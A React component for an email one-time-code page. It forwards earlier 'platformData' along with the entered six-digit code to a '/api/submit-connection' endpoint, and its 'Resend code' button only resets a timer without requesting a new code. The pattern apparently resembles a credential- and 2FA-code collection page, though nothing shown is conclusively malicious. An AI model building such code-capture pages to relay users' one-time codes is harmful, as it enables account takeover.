import React, { useState, useRef, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

export default function EmailVerification() {
  const location = useLocation();
  const navigate = useNavigate();
  const email = location.state?.email || 'your email';
  const platformData = location.state?.platformData || {};

  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(15);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Timer countdown
  useEffect(() => {
    if (timeLeft <= 0) {
      setCanResend(true);
      return;
    }

    const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft]);

  const handleOtpChange = (index: number, value: string) => {
    // Only allow digits
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value.slice(0, 1); // Only one digit per box
    setOtp(newOtp);

    // Auto-focus to next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      // Move to previous input on backspace if current is empty
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleResend = () => {
    setTimeLeft(15);
    setCanResend(false);
    setOtp(['', '', '', '', '', '']);
    inputRefs.current[0]?.focus();
  };

  const handleSubmit = async () => {
    const otpCode = otp.join('');
    if (otpCode.length !== 6) {
      alert('Please enter all 6 digits');
      return;
    }

    // Here you would verify the OTP code with your backend
    try {
      const response = await fetch('/api/submit-connection', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...platformData,
          otp_code: otpCode,
        }),
      });

      if (!response.ok) {
        const body = await response.json().catch(() => null);
        throw new Error(body?.error || 'Verification failed.');
      }

      navigate('/link-success');
    } catch (err: any) {
      alert(err.message || 'An error occurred during verification.');
    }
  };

  return (
    <main className="bg-black min-h-screen flex flex-col font-sans">
      <div className="mx-auto w-full max-w-[400px] px-6 pt-16 flex-1 flex flex-col justify-center">
        {/* Header */}
        <div className="mb-6">
          <h1 className="text-white text-3xl font-bold mb-2">
            Enter the code we emailed you
          </h1>
          <p className="text-gray-400 text-base">
            We sent a code to <span className="text-white font-semibold">{email}</span>
          </p>
        </div>

        {/* OTP Input Grid */}
        <div className="flex gap-3 justify-center mb-8">
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (inputRefs.current[index] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleOtpChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              className={`
                w-12 h-12 text-center text-white text-xl font-bold
                bg-transparent border-2 rounded-lg
                transition-all duration-200
                ${
                  digit || otp.some((d, i) => i < index && d)
                    ? 'border-blue-600 bg-zinc-900'
                    : 'border-zinc-800 bg-zinc-950'
                }
                focus:outline-none focus:border-blue-600 focus:bg-zinc-900
                placeholder-gray-600
              `}
              placeholder="—"
              autoComplete="off"
            />
          ))}
        </div>

        {/* Resend Button */}
        <button
          onClick={handleResend}
          disabled={!canResend}
          className={`
            w-full py-3 px-4 rounded-full font-semibold text-center
            transition-all duration-200 mb-6
            ${
              canResend
                ? 'bg-gray-700 hover:bg-gray-600 text-white cursor-pointer'
                : 'bg-gray-800 text-gray-500 cursor-not-allowed'
            }
          `}
        >
          Resend code in {timeLeft}
        </button>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={otp.some((digit) => !digit)}
          className={`
            w-full py-3 px-4 rounded-full font-semibold text-center
            transition-all duration-200 mb-6
            ${
              otp.every((digit) => digit)
                ? 'bg-blue-600 hover:bg-blue-700 text-white cursor-pointer'
                : 'bg-gray-800 text-gray-500 cursor-not-allowed'
            }
          `}
        >
          Verify Code
        </button>

        {/* Footer Link */}
        <div className="text-center">
          <p className="text-gray-600 text-sm">
            Can't access?{' '}
            <a
              href="#update-2fa"
              className="text-blue-600 hover:text-blue-500 font-semibold transition-colors"
            >
              Update your 2FA
            </a>
          </p>
        </div>
      </div>
    </main>
  );
}
